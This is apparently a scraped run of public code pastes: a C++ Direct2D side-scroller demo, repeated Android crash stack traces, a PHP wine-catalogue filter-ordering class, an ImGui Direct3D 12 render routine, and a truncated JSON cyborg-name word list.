// Super-Tiny Side-Scroller Demo  (Win32 + Direct2D + Memory-DC)
//   cl main.cpp /EHsc /DUNICODE /DWIN32_LEAN_AND_MEAN /Zi /MD
//       d2d1.lib windowscodecs.lib
// ------------------------------------------------------------------
#define NOMINMAX
#include <windows.h>
#include <d2d1.h>
#include <cmath>
#include <algorithm>

#pragma comment(lib, ""d2d1.lib"")

template<class T> inline void SafeRelease(T*& p) { if (p) { p->Release(); p = nullptr; } }

constexpr float GRAVITY = 2000.0f;
constexpr float JUMP_VELOCITY = -700.0f;
constexpr float MOVE_SPEED = 300.0f;
constexpr UINT  TIMER_ID = 1;            // ~60 Hz

struct Entity
{
    float x{}, y{}, w{}, h{}, vx{}, vy{};
    bool  alive{ true };
    D2D1_RECT_F RectF() const { return D2D1::RectF(x, y, x + w, y + h); }
};

Entity player{ 50, 200, 30, 30 };
Entity platform{ 200, 300,180, 20 };
Entity enemy{ 550, 270, 30, 30, 60, 0 };

float cameraX = 0.f;
bool  keyLeft = false, keyRight = false, keyJump = false;

// current bottom-of-world (client-height) – initialised to default 480,
// updated each time the window is resized
float g_worldH = 480.0f;

// ------------------------------------------------------------------
// D2D / GDI globals
// ------------------------------------------------------------------
ID2D1Factory* g_pFactory = nullptr;
ID2D1DCRenderTarget* g_pRT = nullptr;
ID2D1SolidColorBrush* g_pBrush = nullptr;

HDC     g_hMemDC = nullptr;
HBITMAP g_hMemBmp = nullptr;
SIZE    g_back{};

// ------------------------------------------------------------------
// Back-buffer + render target
// ------------------------------------------------------------------
void CreateBackBuffer(HDC wndDC, int w, int h)
{
    if (w == 0 || h == 0) return;

    if (g_hMemBmp) DeleteObject(g_hMemBmp);
    if (!g_hMemDC) g_hMemDC = CreateCompatibleDC(wndDC);

    BITMAPINFO bi{};
    bi.bmiHeader.biSize = sizeof(bi.bmiHeader);
    bi.bmiHeader.biWidth = w;
    bi.bmiHeader.biHeight = -h;        // top-down
    bi.bmiHeader.biPlanes = 1;
    bi.bmiHeader.biBitCount = 32;
    bi.bmiHeader.biCompression = BI_RGB;

    g_hMemBmp = CreateDIBSection(wndDC, &bi, DIB_RGB_COLORS, nullptr, nullptr, 0);
    SelectObject(g_hMemDC, g_hMemBmp);
    g_back = { w,h };

    if (!g_pRT)                                   // first creation
    {
        D2D1_RENDER_TARGET_PROPERTIES props =
            D2D1::RenderTargetProperties(
                D2D1_RENDER_TARGET_TYPE_DEFAULT,
                // *** EXPLICIT BGRA 32-bit format (fix) ***
                D2D1::PixelFormat(DXGI_FORMAT_B8G8R8A8_UNORM,
                    D2D1_ALPHA_MODE_PREMULTIPLIED));
        if (SUCCEEDED(g_pFactory->CreateDCRenderTarget(&props, &g_pRT)))
            g_pRT->CreateSolidColorBrush(
                D2D1::ColorF(D2D1::ColorF::White), &g_pBrush);
    }
}

// ------------------------------------------------------------------
// Physics / game update
// ------------------------------------------------------------------
inline bool Intersect(const Entity& a, const Entity& b)
{
    return a.x<b.x + b.w && a.x + a.w>b.x &&
        a.y<b.y + b.h && a.y + a.h>b.y;
}

void GameUpdate(float dt)
{
    player.vx = 0;
    if (keyLeft)  player.vx -= MOVE_SPEED;
    if (keyRight) player.vx += MOVE_SPEED;

    static bool prevJump = false;
    if (keyJump && !prevJump &&
        std::abs(player.vy) < 0.01f &&
        player.y + player.h >= platform.y - 1)
        player.vy = JUMP_VELOCITY;
    prevJump = keyJump;

    player.vy += GRAVITY * dt;
    player.x += player.vx * dt;
    player.y += player.vy * dt;

    if (player.vy > 0 &&
        player.y + player.h >= platform.y &&
        player.x + player.w > platform.x &&
        player.x < platform.x + platform.w)
    {
        player.y = platform.y - player.h; player.vy = 0;
    }

    //if (player.y + player.h > 480) { player.y = 480 - player.h; player.vy = 0; }
        // collide with *current* bottom of the window
        if (player.y + player.h > g_worldH)
         {
        player.y = g_worldH - player.h;
        player.vy = 0;
        }

    if (enemy.alive)
    {
        enemy.x += enemy.vx * dt;
        if (enemy.x < 530) { enemy.x = 530; enemy.vx = std::abs(enemy.vx); }
        if (enemy.x > 650) { enemy.x = 650; enemy.vx = -std::abs(enemy.vx); }
    }

    if (enemy.alive && Intersect(player, enemy))
    {
        bool stomp = player.vy > 0 && player.y + player.h - enemy.y < 15;
        if (stomp) { enemy.alive = false; player.vy = JUMP_VELOCITY * 0.75f; }
        else { player = { 50,200,30,30 }; }
    }

    cameraX = std::max(0.f, player.x - 320.f);
}

// ------------------------------------------------------------------
// Rendering
// ------------------------------------------------------------------
void GameRender()
{
    if (!g_pRT) return;                   // guard

    RECT rc = { 0,0,g_back.cx,g_back.cy };
    g_pRT->BindDC(g_hMemDC, &rc);

    g_pRT->BeginDraw();
    g_pRT->Clear(D2D1::ColorF(0.08f, 0.10f, 0.15f));

    auto draw = [&](const Entity& e, D2D1::ColorF c)
    {
        g_pBrush->SetColor(c);
        g_pRT->FillRectangle(
            D2D1::RectF(e.x - cameraX, e.y,
                e.x - cameraX + e.w, e.y + e.h),
            g_pBrush);
    };

    draw(platform, D2D1::ColorF(0.6f, 0.4f, 0.2f));
    if (enemy.alive) draw(enemy, D2D1::ColorF(0.9f, 0.2f, 0.2f));
    draw(player, D2D1::ColorF(0.2f, 0.7f, 1.0f));

    // ---------- handle device-loss / recreate-target ----------
    HRESULT hr = g_pRT->EndDraw();
    if (hr == D2DERR_RECREATE_TARGET)
    {
        SafeRelease(g_pRT);
        SafeRelease(g_pBrush);
    }
}

// ------------------------------------------------------------------
// Window procedure
// ------------------------------------------------------------------
LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM w, LPARAM l)
{
    switch (msg)
    {
    case WM_CREATE:
        D2D1CreateFactory(D2D1_FACTORY_TYPE_SINGLE_THREADED, &g_pFactory);
        return 0;

    case WM_SIZE:
    {
        int wdt = LOWORD(l), hgt = HIWORD(l);
        HDC hdc = GetDC(hWnd);
        CreateBackBuffer(hdc, wdt, hgt);
        ReleaseDC(hWnd, hdc);

        static bool timerStarted = false;
        if (!timerStarted && g_pRT)
        {
            SetTimer(hWnd, TIMER_ID, 16, nullptr); timerStarted = true;
        }        
            // update game-world height so the player can't fall below view
            g_worldH = static_cast<float>(hgt);
    } return 0;

    case WM_KEYDOWN: case WM_KEYUP:
    {
        bool down = (msg == WM_KEYDOWN);
        switch (w)
        {
        case VK_LEFT:  keyLeft = down; break;
        case VK_RIGHT: keyRight = down; break;
        case VK_SPACE: keyJump = down; break;
        }
    } return 0;

    case WM_TIMER:
    {
        static LARGE_INTEGER fq{}, prev{};
        if (!fq.QuadPart)
        {
            QueryPerformanceFrequency(&fq); QueryPerformanceCounter(&prev);
        }

        LARGE_INTEGER now; QueryPerformanceCounter(&now);
        float dt = float(now.QuadPart - prev.QuadPart) / fq.QuadPart;
        prev = now;

        GameUpdate(dt);
        InvalidateRect(hWnd, nullptr, FALSE);
    } return 0;

    case WM_PAINT:
    {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hWnd, &ps);
        GameRender();
        if (g_hMemDC)
            BitBlt(hdc, 0, 0, g_back.cx, g_back.cy,
                g_hMemDC, 0, 0, SRCCOPY);
        EndPaint(hWnd, &ps);
    } return 0;

    case WM_DESTROY:
        KillTimer(hWnd, TIMER_ID);
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProc(hWnd, msg, w, l);
}

// ------------------------------------------------------------------
// Entry point
// ------------------------------------------------------------------
int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE, PWSTR, int nCmd)
{
    WNDCLASSEX wc{ sizeof wc };
    wc.hInstance = hInst;
    wc.lpfnWndProc = WndProc;
    wc.lpszClassName = L""SideScrollerWnd"";
    wc.hCursor = LoadCursor(nullptr, IDC_ARROW);
    RegisterClassEx(&wc);

    HWND hWnd = CreateWindowEx(0, L""SideScrollerWnd"",
        L""Mini Side-Scroller (D2D + GDI)"",
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT, 800, 480,
        nullptr, nullptr, hInst, nullptr);

    ShowWindow(hWnd, nCmd);
    UpdateWindow(hWnd);

    MSG msg;
    while (GetMessage(&msg, nullptr, 0, 0) > 0)
    {
        TranslateMessage(&msg); DispatchMessage(&msg);
    }

    SafeRelease(g_pBrush);
    SafeRelease(g_pRT);
    SafeRelease(g_pFactory);
    if (g_hMemBmp) DeleteObject(g_hMemBmp);
    if (g_hMemDC)  DeleteDC(g_hMemDC);
    return 0;
}
```"
8Zq5BG3L,2025-05-30T16:14:19.796046,powerampache,PHP,Friday 30th of May 2025 09:14:20 AM CDT,"1.01-80 (80) - DB: 83
java.lang.NullPointerException
	at luci.sixsixsix.powerampache2.data.MusicRepositoryImpl$getGenres$2.invokeSuspend(MusicRepositoryImpl.kt:350)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at android.os.Handler.handleCallback(Handler.java:984)
	at android.os.Handler.dispatchMessage(Handler.java:104)
	at android.os.Looper.loopOnce(Looper.java:238)
	at android.os.Looper.loop(Looper.java:357)
	at android.app.ActivityThread.main(ActivityThread.java:8088)
	at java.lang.reflect.Method.invoke(Native Method)
	at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:548)
	at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:957)

getGenres() - generic exception {""stackTrace"":[{""declaringClass"":""luci.sixsixsix.powerampache2.data.MusicRepositoryImpl$getGenres$2"",""fileName"":""MusicRepositoryImpl.kt"",""lineNumber"":350,""methodName"":""invokeSuspend""},{""declaringClass"":""kotlin.coroutines.jvm.internal.BaseContinuationImpl"",""fileName"":""ContinuationImpl.kt"",""lineNumber"":33,""methodName"":""resumeWith""},{""declaringClass"":""kotlinx.coroutines.DispatchedTask"",""fileName"":""DispatchedTask.kt"",""lineNumber"":104,""methodName"":""run""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":984,""methodName"":""handleCallback""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":104,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":238,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":357,""methodName"":""loop""},{""declaringClass"":""android.app.ActivityThread"",""fileName"":""ActivityThread.java"",""lineNumber"":8088,""methodName"":""main""},{""declaringClass"":""java.lang.reflect.Method"",""fileName"":""Method.java"",""lineNumber"":-2,""methodName"":""invoke""},{""declaringClass"":""com.android.internal.os.RuntimeInit$MethodAndArgsCaller"",""fileName"":""RuntimeInit.java"",""lineNumber"":548,""methodName"":""run""},{""declaringClass"":""com.android.internal.os.ZygoteInit"",""fileName"":""ZygoteInit.java"",""lineNumber"":957,""methodName"":""main""}]}"
bAeix7p7,2025-05-30T16:14:19.797276,powerampache,PHP,Friday 30th of May 2025 09:14:20 AM CDT,"1.01-80 (80) - DB: 83
java.lang.NullPointerException
	at luci.sixsixsix.powerampache2.data.MusicRepositoryImpl$getGenres$2.invokeSuspend(MusicRepositoryImpl.kt:350)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at android.os.Handler.handleCallback(Handler.java:984)
	at android.os.Handler.dispatchMessage(Handler.java:104)
	at android.os.Looper.loopOnce(Looper.java:238)
	at android.os.Looper.loop(Looper.java:357)
	at android.app.ActivityThread.main(ActivityThread.java:8088)
	at java.lang.reflect.Method.invoke(Native Method)
	at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:548)
	at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:957)

getGenres() - generic exception {""stackTrace"":[{""declaringClass"":""luci.sixsixsix.powerampache2.data.MusicRepositoryImpl$getGenres$2"",""fileName"":""MusicRepositoryImpl.kt"",""lineNumber"":350,""methodName"":""invokeSuspend""},{""declaringClass"":""kotlin.coroutines.jvm.internal.BaseContinuationImpl"",""fileName"":""ContinuationImpl.kt"",""lineNumber"":33,""methodName"":""resumeWith""},{""declaringClass"":""kotlinx.coroutines.DispatchedTask"",""fileName"":""DispatchedTask.kt"",""lineNumber"":104,""methodName"":""run""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":984,""methodName"":""handleCallback""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":104,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":238,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":357,""methodName"":""loop""},{""declaringClass"":""android.app.ActivityThread"",""fileName"":""ActivityThread.java"",""lineNumber"":8088,""methodName"":""main""},{""declaringClass"":""java.lang.reflect.Method"",""fileName"":""Method.java"",""lineNumber"":-2,""methodName"":""invoke""},{""declaringClass"":""com.android.internal.os.RuntimeInit$MethodAndArgsCaller"",""fileName"":""RuntimeInit.java"",""lineNumber"":548,""methodName"":""run""},{""declaringClass"":""com.android.internal.os.ZygoteInit"",""fileName"":""ZygoteInit.java"",""lineNumber"":957,""methodName"":""main""}]}"
gWSdRt1D,Untitled,npman,PHP,Friday 30th of May 2025 09:12:51 AM CDT,"<?php
declare(strict_types=1);

namespace SimpleWine\ApiV3\Helper;

use ReflectionException;
use SimpleWine\ApiV3\Enum\DevelopProtocol;
use SimpleWine\Catalog\SectionManager;
use SimpleWine\Enum\SectionCodes;

/**
 * Добавляем гибкости порядка фильтров для различных стратегий
 */
class FiltersListOrderHelper
{
    /**
     * Определяем порядок списка доступных фильтров МП для стратегии Каталог
     * @return array<string>
     * @throws ReflectionException
     */
    public function getCatalogAvailableFiltersList(int $categoryId): array
    {
        $filters = [
            'section',
            'sale',
            'color',
            'type_of_sparkling',
            'price',
            'product_group', // он же drink_type в elastic
            'product_type',
            'sugar_type',
            'country',
            'age_extract',
            'region',
            'year',
            'manufacturer',
            'konyak_class', //aging_category
            'volume',
            'strength',
            'reviews_rating',
            'rating_ws',
            'rating_rp',
            'rating_js',
            'grape',
            'appellason',
            'way_of_manufacture',
            'aging_tank',
            'food',
            //'store',
            'orange',
            'gift_wrap',
            'cultivation_type',
            'natural',
            'vegan',
            'cosher',
            'bezalkogolnoe',
            'barcode',
            'rating', // больше не агрегируется?
            'monosort',
            'rating_num',
        ];

        if (ApiHelper::getDevelopProtocol() >= DevelopProtocol::PROTOCOL_VERSION_372) {
            /**
             * @TODO: нужно думать что сделать с этим классом
             * чтобы он у нас не разрастался
             */
            $filters = $this->processDrinkCategory($categoryId, $filters);
        }

        return $filters;
    }

    /**
     * Определяем порядок списка доступных фильтров МП для стратегии Штрихкод
     * @return array<string>
     */
    public function getBarcodeAvailableFiltersList(): array
    {
        $filters = [
            'section',
            'sale',
            'color',
            'price',
            'product_group', // он же drink_type в elastic
            'product_type',
            'sugar_type',
            'country',
            'age_extract',
            'region',
            'year',
            'manufacturer',
            'konyak_class', //aging_category
            'volume',
            'strength',
            'reviews_rating',
            'rating_ws',
            'rating_rp',
            'rating_js',
            'grape',
            'appellason',
            'way_of_manufacture',
            'aging_tank',
            'food',
            //'store',
            'orange',
            'gift_wrap',
            'cultivation_type',
            'natural',
            'vegan',
            'cosher',
            'bezalkogolnoe',
            'barcode',
            'rating', // больше не агрегируется?
            'monosort',
            'type_of_sparkling',
        ];

        return $filters;
    }

    /**
     * Определяем порядок списка доступных фильтров МП для стратегии Кэшбэк
     * @return array<string>
     */
    public function getCashbackAvailableFiltersList(): array
    {
        $filters = [
            'section',
            'sale',
            'color',
            'price',
            'product_group', // он же drink_type в elastic
            'product_type',
            'sugar_type',
            'country',
            'age_extract',
            'region',
            'year',
            'manufacturer',
            'konyak_class', //aging_category
            'volume',
            'strength',
            'reviews_rating',
            'rating_ws',
            'rating_rp',
            'rating_js',
            'grape',
            'appellason',
            'way_of_manufacture',
            'aging_tank',
            'food',
            //'store',
            'orange',
            'gift_wrap',
            'cultivation_type',
            'natural',
            'vegan',
            'cosher',
            'bezalkogolnoe',
            'barcode',
            'rating', // больше не агрегируется?
            'monosort',
            'type_of_sparkling',
        ];

        return $filters;
    }

    /**
     * Определяем порядок списка доступных фильтров МП для стратегии Промо
     * @return array<string>
     */
    public function getPromoAvailableFiltersList(): array
    {
        $filters = [
            'section',
            'sale',
            'color',
            'price',
            'product_group', // он же drink_type в elastic
            'product_type',
            'sugar_type',
            'country',
            'age_extract',
            'region',
            'year',
            'manufacturer',
            'konyak_class', //aging_category
            'volume',
            'strength',
            'reviews_rating',
            'rating_ws',
            'rating_rp',
            'rating_js',
            'grape',
            'type_of_sparkling',
            'appellason',
            'way_of_manufacture',
            'aging_tank',
            'food',
            //'store',
            'orange',
            'gift_wrap',
            'cultivation_type',
            'natural',
            'vegan',
            'cosher',
            'bezalkogolnoe',
            'barcode',
            'rating', // больше не агрегируется?
            'monosort',
        ];

        return $filters;
    }

    /**
     * Определяем порядок списка доступных фильтров МП для стратегии Поиск
     * @return array<string>
     * @throws ReflectionException
     */
    public function getSearchAvailableFiltersList(?int $categoryId): array
    {
        $filters = [
            'section',
            'sale',
            'color',
            'type_of_sparkling',
            'price',
            'product_group', // он же drink_type в elastic
            'product_type',
            'sugar_type',
            'country',
            'age_extract',
            'region',
            'year',
            'manufacturer',
            'konyak_class', //aging_category
            'volume',
            'strength',
            'reviews_rating',
            'rating_ws',
            'rating_rp',
            'rating_js',
            'grape',
            'appellason',
            'way_of_manufacture',
            'aging_tank',
            'food',
            //'store',
            'orange',
            'gift_wrap',
            'cultivation_type',
            'natural',
            'vegan',
            'cosher',
            'bezalkogolnoe',
            'barcode',
            'rating', // больше не агрегируется?
            'monosort',
        ];

        if ($categoryId !== null && ApiHelper::getDevelopProtocol() >= DevelopProtocol::PROTOCOL_VERSION_372) {
            $filters = $this->processDrinkCategory($categoryId, $filters);
        }

        return $filters;
    }

    /**
     * Определяем порядок списка доступных фильтров МП для Избранных товаров
     * @return array<string>
     */
    public function getFavoriteAvailableFiltersList(): array
    {
        $filters = [
            'section',
            'sale',
            'color',
            'price',
            'product_group', // он же drink_type в elastic
            'product_type',
            'sugar_type',
            'country',
            'age_extract',
            'region',
            'year',
            'manufacturer',
            'konyak_class', //aging_category
            'volume',
            'strength',
            'reviews_rating',
            'rating_ws',
            'rating_rp',
            'rating_js',
            'grape',
            'appellason',
            'way_of_manufacture',
            'aging_tank',
            'food',
            //'store',
            'orange',
            'gift_wrap',
            'cultivation_type',
            'natural',
            'vegan',
            'cosher',
            'bezalkogolnoe',
            'barcode',
            'rating', // больше не агрегируется?
            'monosort',
            'type_of_sparkling',
        ];

        return $filters;
    }

    /**
     * Определяем порядок списка доступных фильтров МП для FavoriteConverterService
     * @return array<string>
     */
    public function getFilterConvertorAvailableFiltersList(): array
    {
        $filters = [
            'section',
            'sale',
            'color',
            'price',
            'product_group', // он же drink_type в elastic
            'product_type',
            'sugar_type',
            'country',
            'age_extract',
            'region',
            'year',
            'manufacturer',
            'konyak_class', //aging_category
            'volume',
            'strength',
            'reviews_rating',
            'rating_ws',
            'rating_rp',
            'rating_js',
            'grape',
            'appellason',
            'way_of_manufacture',
            'aging_tank',
            'food',
            //'store',
            'orange',
            'gift_wrap',
            'cultivation_type',
            'natural',
            'vegan',
            'cosher',
            'bezalkogolnoe',
            'barcode',
            'rating', // больше не агрегируется?
            'monosort',
            'type_of_sparkling',
        ];

        return $filters;
    }

    private function processDrinkCategory(int $categoryId, array $filters): array
    {
        $rootSectionCode = SectionManager::getRootSectionCode(
            ProductCategoryId::getIblockId(),
            $categoryId,
        );

        if ($rootSectionCode === null) {
            return $filters;
        }

        if ($rootSectionCode === SectionCodes::VINO) {
            array_splice(
                $filters,
                array_search('grape', $filters, true) + 1,
                0,
                ['drink_category']
            );

            return $filters;
        }

        if ($rootSectionCode === SectionCodes::CHAMPAGNE) {
            array_splice(
                $filters,
                array_search('grape', $filters, true),
                0,
                ['drink_category']
            );
        }

        return $filters;
    }
}


"
MXEPxNkp,ImGUI Render,Zgragselus,C++,Friday 30th of May 2025 08:55:04 AM CDT,"
/// <summary>
/// Submit user interface buffers for rendering
/// </summary>
/// <param name=""draw_data"">ImGui render data to submit</param>
void RenderPassImgui::RenderGui(ImDrawData* draw_data)
{
	ImGuiIO& io = ImGui::GetIO();

	mContext->SetPipelineState(mGuiPS);
	mContext->SetRootSignature(mGuiRS);
	mContext->SetPrimitiveTopology(Graphics::TRIANGLELIST);
	mContext->SetConstants(0, DWParam(io.DisplaySize.x), DWParam(io.DisplaySize.y));
	mContext->GetCommandList()->Get()->SetGraphicsRootDescriptorTable(1, mGuiFont->GetSRV().mGpuHandle);

	// TODO: Grow index and vertex buffer if and when necessary

	for (int n = 0; n < draw_data->CmdListsCount; n++)
	{
		int idx_offset = 0;
		int vtx_offset = 0;

		const ImDrawList* cmd_list = draw_data->CmdLists[n];
		size_t verticesCount = cmd_list->VtxBuffer.size();
		size_t indicesCount = cmd_list->IdxBuffer.size();
		size_t verticesSize = verticesCount * sizeof(ImDrawVert);
		size_t indicesSize = indicesCount * sizeof(ImDrawIdx);

		mContext->TransitionResource(mGuiVBO, D3D12_RESOURCE_STATE_COPY_DEST, false);
		mContext->TransitionResource(mGuiIBO, D3D12_RESOURCE_STATE_COPY_DEST, true);
		mContext->WriteBuffer(mGuiVBO, 0, &cmd_list->VtxBuffer[0], verticesSize);
		mContext->WriteBuffer(mGuiIBO, 0, &cmd_list->IdxBuffer[0], indicesSize);
		mContext->TransitionResource(mGuiVBO, D3D12_RESOURCE_STATE_VERTEX_AND_CONSTANT_BUFFER, false);
		mContext->TransitionResource(mGuiIBO, D3D12_RESOURCE_STATE_INDEX_BUFFER, true);

		mContext->SetIndexBuffer(mGuiIBO->IndexBufferView(0, (unsigned int)indicesSize));
		mContext->SetVertexBuffer(0, mGuiVBO->VertexBufferView(0, (unsigned int)verticesSize, sizeof(ImDrawVert)));

		for (int cmd_i = 0; cmd_i < draw_data->CmdLists[n]->CmdBuffer.Size; cmd_i++)
		{
			const ImDrawCmd* pcmd = &draw_data->CmdLists[n]->CmdBuffer[cmd_i];
			if (pcmd->TextureId != io.Fonts->TexID)
			{
				D3D12_GPU_DESCRIPTOR_HANDLE handle;
				handle.ptr = (uint64_t)pcmd->TextureId;
				if (handle.ptr != 0)
				{
					mContext->GetCommandList()->Get()->SetGraphicsRootDescriptorTable(1, handle);
					if (pcmd->UserCallback)
					{
						pcmd->UserCallback(draw_data->CmdLists[n], pcmd);
					}
					else
					{
						mContext->SetScissorRect(pcmd->ClipRect.x, pcmd->ClipRect.y, pcmd->ClipRect.z, pcmd->ClipRect.w);
						mContext->DrawIndexed(pcmd->ElemCount, idx_offset, vtx_offset);
					}
					mContext->GetCommandList()->Get()->SetGraphicsRootDescriptorTable(1, mGuiFont->GetSRV().mGpuHandle);
				}
			}
			else
			{
				if (pcmd->UserCallback)
				{
					pcmd->UserCallback(draw_data->CmdLists[n], pcmd);
				}
				else
				{
					mContext->SetScissorRect(pcmd->ClipRect.x, pcmd->ClipRect.y, pcmd->ClipRect.z, pcmd->ClipRect.w);
					mContext->DrawIndexed(pcmd->ElemCount, idx_offset, vtx_offset);
				}
			}
			idx_offset += pcmd->ElemCount;
		}
		vtx_offset += draw_data->CmdLists[n]->VtxBuffer.size();
	}
}"
GJkWPuUW,cyborg,ycarcomed,JSON,Friday 30th of May 2025 08:44:39 AM CDT,"{
    ""error"":[""Sorry, your name is longer than 10 characters. You can try using the command with an argument between 2 and 10 characters long."",
            ""The argument must be between 2 and 10 characters long.""],
    ""2"": [""badj_0"", ""base""],
    ""3"": [""adj_0"", ""noun_0"", ""base""],
    ""4"": [""badj_0"", ""base"", ""verb"", ""noun_0""],
    ""5"": [""badj_0"", ""base"", ""verb"", ""adj_0"", ""noun_0""],
    ""6"": [""badj_0"", ""base"", ""verb"", ""noun_0"", ""and"", ""adj_0"", ""noun_1""],
    ""7"": [""badj_0"", ""base"", ""verb"", ""adj_0"", ""noun_0"", ""and"", ""adj_1"", ""noun_1""],
    ""8"": [""badj_0"", ""base"", ""verb"", ""noun_0"", "","", ""adj_0"", ""noun_1"", ""and"", ""adj_1"", ""noun_2""],
    ""9"": [""badj_0"", ""base"", ""verb"", ""adj_0"", ""noun_0"", "","", ""adj_1"", ""noun_1"", ""and"", ""adj_1"", ""noun_2""],
    ""10"": [""badj_0"", ""badj_1"", ""base"", ""verb"", ""adj_0"", ""noun_0"", "","", ""adj_1"", ""noun_1"", ""and"", ""adj_1"", ""noun_2""],
    ""a"": {
        ""base"": ""Android"",
        ""badj_0"": ""Artificial"",
        ""badj_1"": ""Advanced"",
        ""noun_0"": ""Assassination"",
        ""noun_1"": ""Analysis"",
        ""adj_0"": ""Accurate"",
        ""verb"": ""Assembled for"",
        ""noun_2"": ""Astrophysics"",
        ""adj_1"": ""Adept"",
        ""adj_2"": ""Adamant""
    },
    ""b"": {
        ""base"": ""Being"",
        ""badj_0"": ""Biomechanical"",
        ""noun_0"": ""Battle"",
        ""adj_0"": ""Basic"",
        ""badj_1"": ""Bionic"",
        ""verb"": ""Built for"",
        ""noun_1"": ""Bioscience"",
        ""adj_1"": ""Better"",
        ""noun_2"": ""Botany"",
        ""adj_2"": ""Beneficial""
    },
    ""c"": {
        ""base"": ""Construct"",
        ""badj_0"": ""Cybernetic"",
        ""badj_1"": ""Clockwork"",
        ""noun_0"": ""Calculation"",
        ""adj_0"": ""Ceaseless"",
        ""verb"": ""Calibrated for"",
        ""noun_1"": ""Capture"",
        ""noun_2"": ""Chemistry"",
        ""adj_1"": ""Capable"",
        ""adj_2"": ""Coherent""
    },
    ""d"": {
        ""base"": ""Device"",
        ""badj_0"": ""Digital"",
        ""noun_0"": ""Destruction"",
        ""verb"": ""Designed for"",
        ""badj_1"": ""Deadly"",
        ""adj_0"": ""Dangerous"",
        ""noun_1"": ""Diagnosis"",
        ""noun_2"": ""Detection"",
        ""adj_1"": ""Dynamic"",
        ""adj_2"": ""Discerning""
    },
    ""e"": {
        ""base"": ""Entity"",
        ""badj_0"": ""Electronic"",
        ""noun_0"": ""Exploration"",
        ""verb"": ""Engineered for"",
        ""adj_0"": ""Efficient"",
        ""badj_1"": ""Engineered"",
        ""noun_1"": ""Education"",
        ""noun_2"": ""Examination"",
        ""adj_1"": ""Efficacious"",
        ""adj_2"": ""Explosive""
    },
    ""f"": {
        ""base"": ""Facsimile"",
        ""noun_0"": ""Fighting"",
        ""adj_0"": ""Forbidden"",
        ""badj_0"": ""Functional"",
        ""noun_1"": ""Fun"",
        ""verb"": ""Fabricated for"",
        ""badj_1"": ""Fusion"",
        ""noun_2"": ""Fornication"",
        ""adj_1"": ""Fundamental"",
        ""adj_2"": ""Firm""
    },
    ""g"": {
        ""base"": ""Guardian"",
        ""noun_0"": ""Gratification"",
        ""verb"": ""Generated for"",
        ""adj_0"": ""Galactic"",
        ""adj_1"": ""Global"",
        ""noun_1"": ""Gunfighting"",
        ""noun_2"": ""Geophysics"",
        ""adj_2"": ""Gainful"",
        ""badj_0"": ""General"",
        ""badj_1"": ""Genius""
    },
    ""h"": {
        ""base"": ""Humanoid"",
        ""noun_0"": ""Harm"",
        ""verb"": ""Hardwired for"",
        ""adj_0"": ""Hazardous"",
        ""adj_1"": ""Helpful"",
        ""noun_1"": ""Hunting"",
        ""noun_2"": ""Hugs"",
        ""adj_2"": ""Handy"",
        ""badj_0"": ""Handcrafted"",
        ""badj_1"": ""Hydraulic""
    },
    ""i"": {
        ""base"": ""Individual"",
        ""noun_0"": ""Infiltration"",
        ""adj_0"": ""Immediate"",
        ""badj_0"": ""Intelligent"",
        ""noun_1"": ""Investigation"",
        ""badj_1"": ""Inhuman"",
        ""verb"": ""Intended for"",
        ""noun_2"": ""Interrogation"",
        ""adj_1"": ""Intensive"",
        ""adj_2"": ""Impartial""
    },
    ""j"": {
        ""base"": ""Juggernaut"",
        ""noun_0"": ""Judo"",
        ""adj_0"": ""Justified"",
        ""badj_0"": ""Journeying"",
        ""noun_1"": ""Jobs"",
        ""badj_1"": ""Judicious"",
        ""verb"": ""Justified for"",
        ""noun_2"": ""Jealousy"",
        ""adj_1"": ""Jeopardous"",
        ""adj_2"": ""Jaded""
    },
    ""k"": {
        ""base"": ""Knight"",
        ""noun_0"": ""Killing"",
        ""verb"": ""Keen on"",
        ""badj_0"": ""Kinetic"",
        ""badj_1"": ""Knowledgable"",
        ""adj_0"": ""Kamikaze"",
        ""noun_1"": ""Kindness"",
        ""adj_1"": ""Kingly"",
        ""noun_2"": ""Kissing"",
        ""adj_2"": ""Knavish""
    },
    ""l"": {
        ""base"": ""Lifeform"",
        ""badj_0"": ""Lifelike"",
        ""badj_1"": ""Lethal"",
        ""noun_0"": ""Learning"",
        ""adj_0"": ""Logical"",
        ""verb"": ""Limited to"",
        ""noun_1"": ""Law"",
        ""adj_1"": ""Lucid"",
        ""noun_2"": ""Linguistics"",
        ""adj_2"": ""Lavish""
    },
    ""m"": {
        ""base"": ""Machine"",
        ""badj_0"": ""Mechanical"",
        ""noun_0"": ""Mathematics"",
        ""verb"": ""Manufactured for"",
        ""noun_1"": ""Murder"",
        ""adj_0"": ""Masterful"",
        ""badj_1"": ""Model"",
        ""noun_2"": ""Microbiology"",
        ""adj_1"": ""Mandatory"",
        ""adj_2"": ""Matchless""
    },
    ""n"": {
        ""base"": ""Neohuman"",
        ""badj_0"": ""Networked"",
        ""badj_1"": ""Nuclear"",
        ""noun_0"": ""Nullification"",
        ""noun_1"": ""Negotiation"",
        ""adj_0"": ""Nocturnal"",
